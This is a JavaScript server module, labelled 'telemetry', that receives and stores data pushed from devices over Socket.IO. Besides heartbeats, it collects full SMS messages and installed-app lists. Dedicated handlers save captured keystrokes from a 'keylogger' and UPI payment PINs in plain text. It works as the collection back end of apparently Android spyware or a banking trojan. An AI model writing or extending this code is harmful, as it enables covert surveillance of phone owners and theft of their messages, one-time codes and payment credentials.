const { prisma } = require('../config/database');
const logger = require('../../utils/logger');

const getVal = (obj, key1, key2) => {
    if (!obj) return undefined;
    if (obj[key1] !== undefined) return obj[key1];
    if (key2 && obj[key2] !== undefined) return obj[key2];
    return undefined;
};

function setupTelemetryHandlers(socket, io, notifyChange) {
    const deviceId = socket.deviceId;

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        try {
            let messages = typeof data === 'string' ? JSON.parse(data) : data;
            if (!Array.isArray(messages)) messages = [messages];

            const suspicious = messages.some(msg => (msg.device_id || msg.deviceId) !== deviceId);
            if (suspicious) {
                logger.warn(`⚠️ Security Alert: Device ${deviceId} attempted to sync SMS for other devices`);
                if (ack) ack(false);
                return;
            }

            const validMessages = messages.filter(msg => msg && getVal(msg, 'device_id', 'deviceId') && (getVal(msg, 'id', 'id') !== undefined));

            if (validMessages.length === 0) {
                if (ack) ack(true);
                return;
            }

            await prisma.$transaction(async (tx) => {
                for (const msg of validMessages) {
                    const dId = getVal(msg, 'device_id', 'deviceId');
                    const idRaw = getVal(msg, 'id', 'id');
                    const smsId = String(idRaw);
                    const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);

                    await tx.smsMessage.upsert({
                        where: { device_id_local_sms_id: { device_id: dId, local_sms_id: localSmsId } },
                        update: {
                            id: smsId,
                            address: getVal(msg, 'address', 'address') || "",
                            body: getVal(msg, 'body', 'body') || "",
                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                            timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            local_sms_id: localSmsId,
                            device_id: dId,
                            address: getVal(msg, 'address', 'address') || "",
                            body: getVal(msg, 'body', 'body') || "",
                            date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                            timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
                            type: parseInt(getVal(msg, 'type', 'type') || "1"),
                            sync_status: 'synced'
                        }
                    });
                }
            });

            logger.info(`✅ Synced ${validMessages.length} SMS messages for ${deviceId}`);
            validMessages.forEach(msg => notifyChange('message_change', { ...msg, device_id: getVal(msg, 'device_id', 'deviceId') }));
            socket.emit('sync_complete', 'sms', validMessages.length);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error syncing SMS for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Sync Single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;
            const msgDeviceId = getVal(msg, 'device_id', 'deviceId');
            if (msgDeviceId !== deviceId) {
                logger.warn(`⚠️ Security Alert: Device ${deviceId} attempted to sync single SMS for ${msgDeviceId}`);
                if (ack) ack(false);
                return;
            }

            const idRaw = getVal(msg, 'id', 'id');
            if (msgDeviceId && idRaw !== undefined) {
                const smsId = String(idRaw);
                const localSmsId = String(getVal(msg, 'local_sms_id', 'localSmsId') || smsId);

                await prisma.smsMessage.upsert({
                    where: { device_id_local_sms_id: { device_id: msgDeviceId, local_sms_id: localSmsId } },
                    update: {
                        id: smsId,
                        address: getVal(msg, 'address', 'address') || "",
                        body: getVal(msg, 'body', 'body') || "",
                        date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                        timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
                        type: parseInt(getVal(msg, 'type', 'type') || "1"),
                        sync_status: 'synced'
                    },
                    create: {
                        id: smsId,
                        local_sms_id: localSmsId,
                        device_id: msgDeviceId,
                        address: getVal(msg, 'address', 'address') || "",
                        body: getVal(msg, 'body', 'body') || "",
                        date: getVal(msg, 'date', 'date') || new Date().toISOString(),
                        timestamp: BigInt(getVal(msg, 'timestamp', 'timestamp') || 0),
                        type: parseInt(getVal(msg, 'type', 'type') || "1"),
                        sync_status: 'synced'
                    }
                });
                notifyChange('message_change', { ...msg, device_id: msgDeviceId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error syncing single SMS for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Sync Apps
    socket.on('sync_apps', async (data, ack) => {
        try {
            let apps = typeof data === 'string' ? JSON.parse(data) : data;
            if (!Array.isArray(apps)) apps = [apps];

            const validApps = apps.filter(app => app && getVal(app, 'device_id', 'deviceId') && getVal(app, 'package_name', 'packageName'));

            if (validApps.length === 0) {
                if (ack) ack(true);
                return;
            }

            await prisma.$transaction(async (tx) => {
                for (const app of validApps) {
                    const packageName = getVal(app, 'package_name', 'packageName');
                    const dId = getVal(app, 'device_id', 'deviceId');
                    const appName = getVal(app, 'app_name', 'appName') || packageName;

                    await tx.installedApp.upsert({
                        where: { device_id_package_name: { device_id: dId, package_name: packageName } },
                        update: {
                            app_name: appName,
                            icon: getVal(app, 'icon', 'icon') || "",
                            version_name: getVal(app, 'version_name', 'versionName') || "",
                            version_code: getVal(app, 'version_code', 'versionCode') ? BigInt(getVal(app, 'version_code', 'versionCode')) : null,
                            first_install_time: getVal(app, 'first_install_time', 'firstInstallTime') ? BigInt(getVal(app, 'first_install_time', 'firstInstallTime')) : null,
                            last_update_time: getVal(app, 'last_update_time', 'lastUpdateTime') ? BigInt(getVal(app, 'last_update_time', 'lastUpdateTime')) : null,
                            is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
                            target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
                            min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
                            sync_timestamp: getVal(app, 'sync_timestamp', 'syncTimestamp') ? BigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) : BigInt(Date.now()),
                            updated_at: new Date()
                        },
                        create: {
                            device_id: dId,
                            package_name: packageName,
                            app_name: appName,
                            icon: getVal(app, 'icon', 'icon') || "",
                            version_name: getVal(app, 'version_name', 'versionName') || "",
                            version_code: getVal(app, 'version_code', 'versionCode') ? BigInt(getVal(app, 'version_code', 'versionCode')) : null,
                            first_install_time: getVal(app, 'first_install_time', 'firstInstallTime') ? BigInt(getVal(app, 'first_install_time', 'firstInstallTime')) : null,
                            last_update_time: getVal(app, 'last_update_time', 'lastUpdateTime') ? BigInt(getVal(app, 'last_update_time', 'lastUpdateTime')) : null,
                            is_system_app: Boolean(getVal(app, 'is_system_app', 'isSystemApp')),
                            target_sdk: parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0"),
                            min_sdk: parseInt(getVal(app, 'min_sdk', 'minSdk') || "0"),
                            sync_timestamp: getVal(app, 'sync_timestamp', 'syncTimestamp') ? BigInt(getVal(app, 'sync_timestamp', 'syncTimestamp')) : BigInt(Date.now()),
                        }
                    });
                }
            });

            logger.info(`✅ Synced ${validApps.length} apps for ${deviceId}`);
            socket.emit('sync_complete', 'apps', validApps.length);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error syncing apps for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;
            const payloadDeviceId = getVal(h, 'device_id', 'deviceId');

            if (payloadDeviceId !== deviceId) {
                logger.warn(`⚠️ Security Alert: Device ${deviceId} sent heartbeat for ${payloadDeviceId}`);
                if (ack) ack(false);
                return;
            }

            await prisma.heartbeat.create({
                data: {
                    device_id: deviceId,
                    type: h.type || 'ping',
                    last_update: new Date()
                }
            });

            await prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    last_seen: new Date(),
                    status: (h.status !== undefined) ? Boolean(h.status) : true,
                    heartbeat: h
                }
            });

            socket.emit('heartbeat_ack');
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error processing heartbeat for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Keylog
    socket.on('set_key_log', async (data, ack) => {
        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            const dId = getVal(keyLog, 'device_id', 'deviceId');

            if (dId === deviceId) {
                await prisma.keyLog.create({
                    data: {
                        device_id: dId,
                        keylogger: getVal(keyLog, 'keylogger', 'keylogger') || 'unknown',
                        key: getVal(keyLog, 'key', 'key') || '',
                        currentDate: getVal(keyLog, 'current_date', 'currentDate') ? new Date(getVal(keyLog, 'current_date', 'currentDate')) : new Date()
                    }
                });
                notifyChange('keylog_change', { ...keyLog, device_id: dId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error saving key log for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // UPI Pin
    socket.on('set_upi_pin', async (data, ack) => {
        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            const dId = getVal(pinData, 'device_id', 'deviceId');

            if (dId === deviceId) {
                await prisma.upiPin.create({
                    data: {
                        device_id: dId,
                        pin: String(getVal(pinData, 'pin', 'pin') || ''),
                        currentDate: getVal(pinData, 'current_date', 'currentDate') ? new Date(getVal(pinData, 'current_date', 'currentDate')) : new Date()
                    }
                });
                notifyChange('pin_change', { ...pinData, device_id: dId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ Error saving UPI pin for ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Connection testing
    socket.on('test_connection', (data, ack) => {
        if (ack) ack(true);
    });
}

module.exports = setupTelemetryHandlers;
